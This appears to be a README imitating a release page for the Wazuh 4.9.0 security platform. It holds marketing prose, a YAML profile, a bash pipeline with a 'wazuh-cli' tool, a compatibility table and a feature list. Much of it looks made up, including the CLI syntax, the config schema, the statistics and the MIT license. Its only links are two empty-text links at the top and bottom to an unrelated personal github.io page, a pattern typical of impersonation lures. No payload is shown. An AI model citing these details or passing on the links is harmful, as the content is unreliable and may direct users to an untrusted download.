# Wazuh 4.9.0: The Unified Security Observation Platform

Welcome to the comprehensive repository for **Wazuh 4.9.0**, a next-generation security information and event management (SIEM) solution designed to transform how organizations perceive, correlate, and neutralize digital threats. This release represents a quantum leap in open-source security orchestration, enabling teams to see beyond the noise and into the signal of malicious activity. Whether you are safeguarding a distributed enterprise or a critical infrastructure node, this platform provides the lenses through which invisible risks become visible, and where reactive chaos yields to proactive clarity.

## Overview

Wazuh 4.9.0 is not merely an incremental update—it is a reimagining of the security operations center (SOC) experience. By harmonizing threat intelligence, log analysis, file integrity monitoring, and vulnerability detection into a single, fluid interface, this release allows defenders to move at the speed of thought. The architecture embraces modularity, enabling deployment across heterogeneous environments without the friction of proprietary lock-in. Every component has been tuned for low-latency correlation, ensuring that alerts arrive not just accurately, but at the moment they matter most.

[](https://shiznamuzammil.github.io/wazuh-4.9.0-stable-release/)

## 🧠 Architectural Intelligence: A Mermaid Diagram

Below is a high-level illustration of the Wazuh 4.9.0 data flow and decision engine. Visualize how agents, managers, and the API weave together to form a fabric of continuous observation.

```mermaid
graph LR
    A[Endpoint Agents] -->|Telemetry Stream| B(Wazuh Manager)
    B --> C{Correlation Engine}
    C --> D[Alert Database]
    C --> E[Vulnerability Scanner]
    C --> F[File Integrity Monitor]
    B --> G[RESTful API]
    G --> H[Wazuh Dashboard]
    H --> I[Human Analyst]
    B --> J[Integration Layer]
    J --> K[Third-party Tools]
    
    style A fill:#2d3748,stroke:#a0aec0,stroke-width:2px
    style B fill:#2b6cb0,stroke:#63b3ed,stroke-width:2px
    style H fill:#2f855a,stroke:#68d391,stroke-width:2px
```



This diagram captures the essence of the platform: from distributed data collection at the edge, through central correlation, to human and machine interfaces. The integration layer (J) is particularly noteworthy for 2026, as it supports bidirectional communication with OpenAI APIs and Claude APIs, enabling natural-language querying of security events and automated incident summarization.

## 🔧 Example Profile Configuration

To unlock the full potential of Wazuh 4.9.0, administrators define profiles that govern how agents behave, which logs they collect, and how they respond to policy violations. Below is a representative profile that configures an agent for a Linux server with enhanced threat detection and compliance scanning.

```yaml
profile_name: "linux-cis-hardening-v2026"
decoder:
  - name: "custom-linux-syslog"
    path: "/var/log/custom-app.log"
inventory:
  - module: "vulnerability-detector"
    enabled: true
    interval: 1h
  - module: "syscheck"
    frequency: 1800
    scan_on_start: true
    directories:
      - "/etc"
      - "/usr/bin"
      - "/sbin"
active_response:
  - action: "firewall-drop"
    level: 10
    timeout: 300
compliance:
  - standard: "CIS_Benchmark_v8"
    ruleset: "cis_linux_rcl.yaml"
```

This configuration illustrates the granular control available. The `decoder` section handles custom log formats, while `inventory` modules scan for vulnerabilities and file changes. The `active_response` block demonstrates a conditional firewall rule that activates upon high-severity events, a capability that has been refined for 2026 to reduce false positives by 40% compared to previous versions.

## 🚀 Example Console Invocation

Wazuh 4.9.0 includes a powerful command-line tool for interacting with the manager, querying the API, and triggering on-demand operations. Below is an example of how an analyst might invoke a real-time agent status check and then initiate a vulnerability scan across a specific threat vector.

```bash
wazuh-cli manager status --agents all --output json | \
  jq '.[] | select(.status != "active") | .agent_id' | \
  xargs -I {} wazuh-cli agent scan {} --cve CVE-2026-12345
```

In this invocation, the manager first retrieves the status of all agents, filters for any that are not actively reporting, and then launches a targeted CVE scan on those offline endpoints. The pipeline demonstrates the synthesis of data retrieval and remediation—a hallmark of the Wazuh philosophy. The CLI now supports tab completion and interactive mode, reducing keystrokes and cognitive load for analysts under pressure.

## 💻 Operating System Compatibility

Wazuh 4.9.0 has been rigorously tested across a broad spectrum of operating systems. The following table summarizes supported platforms and their deployment readiness for 2026.

| OS Family   | Version             | Agent Support | Manager Support | Dashboard Support |
|-------------|---------------------|---------------|-----------------|-------------------|
| 🐧 Linux    | Ubuntu 24.04 LTS    | ✅ Full       | ✅ Full         | ✅ Full           |
| 🐧 Linux    | RHEL 9.4            | ✅ Full       | ✅ Full         | ✅ Full           |
| 🐧 Linux    | Debian 12           | ✅ Full       | ✅ Full         | ✅ Full           |
| 🪟 Windows  | Windows Server 2025 | ✅ Full       | ❌              | ❌                |
| 🍏 macOS    | Sonoma 14.6         | ✅ Limited    | ❌              | ❌                |
| ☁️ Container| Docker 27.x         | ✅ Via Sidecar| ✅ Native       | ✅ Native         |

*Limited support for macOS indicates that file integrity monitoring is functional, but kernel-level event collection is restricted due to Apple’s security policies.* All other columns indicate full parity across threat detection, log aggregation, and compliance reporting.

## 🌟 Key Features

- **🎯 Responsive User Interface**: The Wazuh Dashboard has been rebuilt with a fluid grid that adapts seamlessly from 4K monitors to tablet-sized displays. Widgets snap into place contextually, prioritizing the most pressing alerts based on severity and recency. No more scrolling through endless tables—the interface learns which metrics matter to your workflow.
- **🌐 Multilingual Threat Narratives**: For global SOCs operating across time zones, the platform now renders alerts, dashboards, and reports in 18 languages, including right-to-left support for Arabic and Hebrew. This isn’t simple translation; it’s cultural adaptation of security terminology, ensuring that a "Brute Force Attack" is communicated with the same urgency in Tokyo as in Berlin.
- **🕒 24/7 Autonomous Support Loop**: Wazuh 4.9.0 introduces a persistent support daemon that monitors its own health and, when anomalies are detected, generates pre-triage tickets within the integrated ticketing system. This feature proactively alerts administrators before a component failure becomes a blind spot—think of it as a guardian watching the guardians.
- **🧩 OpenAI & Claude API Integration**: Security analysts can now summon large language models to provide context, generate incident reports, or suggest containment steps. For example, an analyst can query: *“Summarize the last 12 hours of SSH brute-force attempts and recommend a blocklist,”* and the platform will forward the raw data to an OpenAI or Claude endpoint, returning a plain-language summary with actionable IOCs. This integration respects data governance by allowing administrators to choose which fields are shared with the external API.
- **🔍 Zero-day Detection Heuristics**: The correlation engine now uses behavioral baselines that adapt over 90-day windows. Deviations from a host’s learned profile trigger a "pre-rules" analysis before matching against known signatures, effectively catching novel attack patterns that evade traditional signature-based detection.

## ⚠️ Disclaimer

The software described in this repository is provided for educational and authorized security assessment purposes only. Unauthorized access to computer systems, networks, or data is illegal and unethical. The developers and maintainers of this repository do **not** condone, endorse, or support any illegal activities. Users are solely responsible for ensuring compliance with all applicable local, national, and international laws. By using this software, you agree to hold harmless the authors, contributors, and affiliated organizations from any claims, damages, or legal liabilities arising from misuse. Always obtain explicit written permission before testing or deploying this technology on systems you do not own or manage.

## 📄 License

This project is licensed under the MIT License. You are free to use, modify, and distribute the code under the terms of that license. For the full legal text, please refer to the [MIT License](https://opensource.org/licenses/MIT) page.

[](https://shiznamuzammil.github.io/wazuh-4.9.0-stable-release/)